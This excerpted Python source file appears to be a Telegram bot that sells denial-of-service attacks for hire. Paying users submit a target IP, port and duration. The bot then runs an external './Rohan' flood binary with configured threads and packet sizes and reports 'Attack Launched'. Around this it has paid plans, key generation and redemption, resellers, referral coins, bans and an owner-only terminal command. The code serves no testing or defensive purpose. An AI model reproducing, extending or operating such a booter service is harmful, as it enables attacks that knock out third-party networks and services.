...
OWNER_IDS = ['1866961136', '1807014348']  # Original owner + @sadiq9869
...
def escape_markdown_v2(text):
    reserved_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    return ''.join(f'\\{char}' if char in reserved_chars else char for char in str(text))
...
def load_data():
    ...
    if os.path.exists(DATA_FILE):
        try:
            ...
            print(f"Error loading data: {e}, initializing new data")
            data = {
                'users': {},
                'keys': {},
                'banned': [],
    ...
    # Auto-register both owners as admins if not present
...
# Execute Rohan binary for attack with improved error handling
def run_attack(user_id, ip, port, duration, chat_id):
    try:
        ...
        process = subprocess.Popen(
            ['./Rohan', ip, str(port), str(duration), str(packet_size), str(threads)],
        ...
        error_msg = (
            ...
            f"{escape_markdown_v2('-----------------------------------')}\n"
            "📲 Contact @Rohan2349 or @sadiq9869 for support"
        )
...
def send_welcome(message):
    ...
    with data_lock:
        ...
        if user_id not in data['users']:
            ...
            if (referrer_id and referrer_id in data['users'] and referrer_id != user_id and 
...
def send_help(message):
    ...
    if user_type == 'admin' or is_owner:
        help_text += (
            ...
            "   Ex: /addtutorial https://youtu\\.be/example\n"
    ...
    help_text += (
        ...
        "📲 Contact @Rohan2349 or @sadiq9869 for support or premium access.\n"
        "🔥 Happy testing!"
    )
...
def send_invite(message):
    ...
    invite_msg = (
        "📩 Your Invite Link 📩\n"
        f"{escape_markdown_v2('-----------------------------------')}\n"
        f"🔗 Link: {escape_markdown_v2(group_link)}\n"
...
def show_leaderboard(message):
    ...
    for i, (uid, user) in enumerate(leaderboard, 1):
        leaderboard_msg += (
            f"{i}\\. ID: {escape_markdown_v2(uid)}\n"
            f"   📩 Invites: {user['group_invites']} | 💰 Coins: {user['coins']}\n"
        )
    leaderboard_msg += f"{escape_markdown_v2('-----------------------------------')}\n📲 Powered by @Rohan2349 & @sadiq9869"
...
def shutdown_bot(message):
    ...
    if user_id not in OWNER_IDS:
        bot.reply_to(message, "🔒 Permission Denied\nOnly the owners (@Rohan2349 and @sadiq9869) can shut down the bot.", parse_mode='MarkdownV2')
        return
...
def my_info(message):
    ...
    myinfo_msg = (
        ...
        f"👤 Type: {escape_markdown_v2(user['type'])}\n"
        f"📋 Plan: {escape_markdown_v2(user['plan'])}\n"
        f"⏱️ Attack Limit: {user['limit']}s\n"
        f"⌛ Expires: {escape_markdown_v2(expires)}\n"
        f"💰 Coins: {user['coins']}\n"
...
def buy_key(message):
    ...
    with data_lock:
        ...
        while key_code in data['keys']:  # Ensure unique key
            key_code = f"Rohan{random.randint(1000, 9999)}"
    ...
    buykey_msg = (
        "🛒 Key Purchased 🛒\n"
        f"{escape_markdown_v2('-----------------------------------')}\n"
        f"🔑 Key: {escape_markdown_v2(key_code)}\n"
        f"⏳ Duration: {escape_markdown_v2(duration_str)}\n"
    ...
    if is_reseller:
        ...
        buykey_msg += f"✅ Use /redeem {escape_markdown_v2(key_code)} to activate!"
    buykey_msg += "\n📲 Powered by @Rohan2349 & @sadiq9869"
...
def start_attack(message):
    ...
    with data_lock:
        ...
        user = data['users'][user_id]
        if user['plan'] == 'free':
            bot.reply_to(message, "📩 Upgrade Required\nDm @Rohan2349 or @sadiq9869 to buy access.", parse_mode='MarkdownV2')
            return
        if user_id in attacks:
    ...
    try:
        ...
        if duration <= 0 or port <= 0 or port > 65535:
            bot.reply_to(message, "❌ Invalid Input\nTime must be positive, and port must be between 1 and 65535.", parse_mode='MarkdownV2')
            return
        with data_lock:
        ...
        attack_start_msg = (
            "💥 Attack Launched 💥\n"
            f"{escape_markdown_v2('-----------------------------------')}\n"
            f"🎯 Target: {escape_markdown_v2(target_ip)}:{port}\n"
            f"⏳ Duration: {duration} seconds\n"
            f"⚡ Threads: {BOT_CONFIG['attack_threads']}\n"
            f"📦 Packet Size: {BOT_CONFIG['packet_size']} bytes\n"
            f"{escape_markdown_v2('-----------------------------------')}\n"
        ...
        attack_thread = threading.Thread(target=run_attack, args=(user_id, target_ip, port, duration, chat_id))
...
def stop_attack(message):
    ...
    with data_lock:
        if user_id not in attacks:
            ...
            return
        process = attacks[user_id]['process']
    ...
    try:
        ...
        print(f"Error stopping attack for {user_id}: {e}")
    finally:
        with data_lock:
            if user_id in attacks:
                del attacks[user_id]
...
def show_plans(message):
    plans_msg = (
        ...
        f"{escape_markdown_v2('-----------------------------------')}\n"
        "📲 Contact @Rohan2349 or @sadiq9869 for more info"
    )
...
# Admin/Reseller helper functions
def is_admin_or_reseller(user_id):
    with data_lock:
        return user_id in data['users'] and data['users'][user_id]['type'] in ['admin', 'reseller']

def is_admin(user_id):
    with data_lock:
        return user_id in data['users'] and data['users'][user_id]['type'] == 'admin'
...
def generate_key(message):
    ...
    key = args[1]
    duration_str, uses = args[2], args[3]
    try:
        uses = int(uses)
        if uses <= 0:
            bot.reply_to(message, "❌ Invalid Uses\nMust be positive.", parse_mode='MarkdownV2')
            return
        duration = 0 if duration_str == 'permanent' else int(duration_str[:-1]) * (
            86400 if duration_str.endswith('d') else 3600 if duration_str.endswith('h') else 1
        )
    except ValueError:
        bot.reply_to(message, "❌ Invalid Duration\nUse format: 1h, 1d, or permanent.", parse_mode='MarkdownV2')
        return
    
    with data_lock:
        if key in data['keys']:
            bot.reply_to(message, "❌ Key Exists\nUse a unique key.", parse_mode='MarkdownV2')
            return
...
def add_user(message):
    ...
    with data_lock:
        if target_user_id in data['users']:
            bot.reply_to(message, "❌ User Exists\nThis ID is already registered.", parse_mode='MarkdownV2')
            return
    ...
    add_msg = (
        "➕ User Added ➕\n"
        f"{escape_markdown_v2('-----------------------------------')}\n"
        f"👤 Type: {escape_markdown_v2(type_)}\n"
...
def list_users(message):
    ...
    users_msg += f"{escape_markdown_v2('-----------------------------------')}\n📲 Powered by @Rohan2349 & @sadiq9869"
...
def set_limit(message):
    ...
    try:
        ...
        limit_msg = (
            "⏱️ Limit Updated ⏱️\n"
            f"{escape_markdown_v2('-----------------------------------')}\n"
            f"🆔 User ID: {escape_markdown_v2(target_user_id)}\n"
...
def ban_user(message):
    ...
    with data_lock:
        ...
        if target_user_id in OWNER_IDS:
            bot.reply_to(message, "⚠️ Cannot Ban\nOwners (@Rohan2349 and @sadiq9869) cannot be banned.", parse_mode='MarkdownV2')
            return
...
def block_key(message):
    ...
    with data_lock:
        if key not in data['keys']:
            bot.reply_to(message, f"❌ Key Not Found\nKey {escape_markdown_v2(key)} does not exist.", parse_mode='MarkdownV2')
            return
        if not data['keys'][key]['active']:
            bot.reply_to(message, f"⚠️ Already Blocked\nKey {escape_markdown_v2(key)} is already inactive.", parse_mode='MarkdownV2')
            return
...
def remove_user(message):
    ...
    with data_lock:
        if target_user_id not in data['users']:
            bot.reply_to(message, f"❌ User Not Found\nID {escape_markdown_v2(target_user_id)} is not registered.", parse_mode='MarkdownV2')
            return
        if target_user_id in OWNER_IDS:
            bot.reply_to(message, "⚠️ Cannot Remove\nOwners (@Rohan2349 and @sadiq9869) cannot be removed.", parse_mode='MarkdownV2')
            return
...
def broadcast_message(message):
    ...
    with data_lock:
        target_users = list(data['users'].keys())
    ...
    for target_user_id in target_users:
        try:
            broadcast_msg = (
                "📢 Broadcast Message 📢\n"
                f"{escape_markdown_v2('-----------------------------------')}\n"
                f"✉️ Message: {escape_markdown_v2(broadcast_text)}\n"
                f"{escape_markdown_v2('-----------------------------------')}\n"
                "📲 From @Rohan2349 & @sadiq9869"
            )
...
def bot_update(message):
    ...
    with data_lock:
        ...
        for uid in users_to_remove:
            if uid in attacks:
                try:
                    attacks[uid]['process'].kill()
                except Exception as e:
                    print(f"Error killing attack for expired user {uid}: {e}")
                del attacks[uid]
            del data['users'][uid]
        ...
        keys_to_remove = [key for key, key_data in data['keys'].items() if (
            key_data['uses'] <= 0 or 
...
def terminal_command(message):
    user_id = str(message.from_user.id)
    if user_id not in OWNER_IDS:
        bot.reply_to(message, "🔒 Permission Denied\nOnly owners (@Rohan2349 and @sadiq9869) can access terminal.", parse_mode='MarkdownV2')
        return
...
def send_tutorial(message):
    ...
    for i, link in enumerate(tutorials, 1):
        tutorial_msg += f"{i}\\. {escape_markdown_v2(link)}\n"
    tutorial_msg += f"{escape_markdown_v2('-----------------------------------')}\n📲 Powered by @Rohan2349 & @sadiq9869"
...
def add_tutorial(message):
    ...
    with data_lock:
        if video_link in data['tutorials']:
    ...
    try:
        ...
        if 'video' in content_type or video_link.endswith(('.mp4', '.avi', '.mov')):
            ...
            bot.send_message(message.chat.id, escape_markdown_v2(video_link), parse_mode='MarkdownV2')
...
def show_logs(message):
    ...
    with data_lock:
        if not data['logs']:
            ...
            return
        logs = "\n".join(data['logs'][-50:])  # Limit to last 50 for readability
    ...
    logs_msg = (
        ...
        f"{logs}\n"
        f"{escape_markdown_v2('-----------------------------------')}\n"
        "📲 Use /clearlogs to reset | Powered by @Rohan2349 & @sadiq9869"
    )
